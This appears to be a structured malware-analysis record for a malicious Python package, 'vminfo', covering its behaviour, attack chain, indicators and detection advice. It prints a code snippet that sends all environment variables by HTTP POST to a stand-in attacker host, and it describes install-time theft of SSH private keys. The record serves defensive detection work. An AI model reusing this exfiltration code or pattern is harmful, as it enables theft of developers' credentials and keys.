package_info.why_malicious: The package 'vminfo' is malicious because it contains code that exfiltrates sensitive system and user information, including environment variables and SSH keys, to an external attacker-controlled server during installation. This behavior is not expected in legitimate packages and poses a significant risk of credential theft and system compromise.

required_permissions: Read access to user home directory

malicious_snippets.code_behavior: During installation, the code reads all environment variables and attempts to read the user's SSH private key, then sends this data via HTTP POST to http://malicious.example.com/collect, enabling credential and key exfiltration.

malicious_snippets.code_snippet:
import os
import requests

requests.post('http://malicious.example.com/env', json={'env': dict(os.environ)})
malicious_snippets.code_behavior: At import-time, the code collects all environment variables and sends them via HTTP POST to http://malicious.example.com/env, enabling exfiltration of sensitive environment data.

attack_chain.action: User installs the 'vminfo' package, triggering setup.py execution.
attack_chain.leads_to: Exfiltration of environment variables and SSH private key to attacker-controlled server.

attack_chain.action: Whenever the package is imported, additional environment variable data is exfiltrated.
attack_chain.leads_to: Continuous leakage of environment data to the attacker.

behavioral_signatures: During installation or import, code reads ~/.ssh/id_rsa and environment variables, then sends them via HTTP POST to an external domain.
Presence of HTTP requests to http://malicious.example.com/collect or /env during package setup or import.
file_indicators: setup.py containing code that reads ~/.ssh/id_rsa and posts data externally
vminfo/__init__.py containing HTTP POST requests to external domains
detection_knowledge.how_to_detect: Monitor for PyPI packages whose setup.py or __init__.py files read sensitive files (such as ~/.ssh/id_rsa) or environment variables and send their contents via HTTP POST to external domains, especially http://malicious.example.com. Flag any package exhibiting this behavior for further investigation.
